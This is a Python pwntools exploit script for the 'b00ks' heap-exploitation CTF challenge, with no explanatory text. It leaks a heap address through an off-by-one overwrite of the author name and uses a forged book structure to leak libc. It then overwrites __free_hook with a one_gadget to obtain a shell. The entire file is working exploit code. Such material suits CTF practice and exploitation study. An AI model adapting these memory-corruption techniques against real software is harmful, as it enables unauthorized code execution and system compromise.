#coding:utf8
from pwn import *
# from LibcSearcher import *
context(log_level='debug',terminal=["tmux","splitw","-h"])
binary = "./b00ks"
libc_binary = "/lib/x86_64-linux-gnu/libc.so.6"

p = process(argv=[binary])
# p = remote("",)

elf = ELF(binary)
libc = ELF(libc_binary)

context.arch = "amd64"

def opt(idx):
    p.sendlineafter("> ",str(idx))

def add(length,content,desc_size,desc):
    opt(1)
    p.sendlineafter("Enter book name size:",str(length))
    p.sendlineafter("Enter book name (Max 32 chars):",str(content))
    p.sendlineafter("Enter book description size:",str(desc_size))
    p.sendlineafter("Enter book description:",str(desc))

def free(idx):
    opt(2)
    p.sendlineafter("Enter the book id you want to delete: ",str(idx))

def edit(idx,content):
    opt(3)
    p.sendlineafter("Enter the book id you want to edit:",str(idx))
    p.sendlineafter("Enter new book description:",str(content))

def show():
    opt(4)

def edit_book_name(content):
    opt(5)
    p.sendlineafter("Enter author name:",content)

# leak heap_base
p.sendlineafter("Enter author name:","a"*0x20)
add(0x88,"a"*0x88,0x88,"b"*0x88)
show()
p.recvuntil("Author: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa")
chunk1_addr = u64(p.recv(6).ljust(8,"\0"))
offset = 0x1140
heap_base = chunk1_addr - offset
log.success("heap_base is -> " + hex( heap_base ))

add(0x21000, "a", 0x21000, "b")

target = heap_base + 0x1178

# leak libc addr
payload = flat([
    "z"*0x50,
    1,target,
    target,0xffff
    ])
edit(1,payload)
edit_book_name("a"*0x20)
p.recv()
show()
p.recvuntil("Description: ")
call_back = u64(p.recv(6).ljust(8,"\0"))
offset = 0x5ab010
libc_addr = call_back - offset
log.success("libc_addr addr is -> "+ hex( libc_addr ))

# getshell
one_offset = 0x4527a
__free_hook = libc_addr + libc.sym["__free_hook"]
one_gadget = libc_addr + one_offset
edit(1,p64(__free_hook)*2)
edit(2,p64(one_gadget)*2)
free(1)

# gdb.attach(p,"set $h=0x555555758010,$g=0x555555756060,$auth=0x555555756040")

p.interactive()
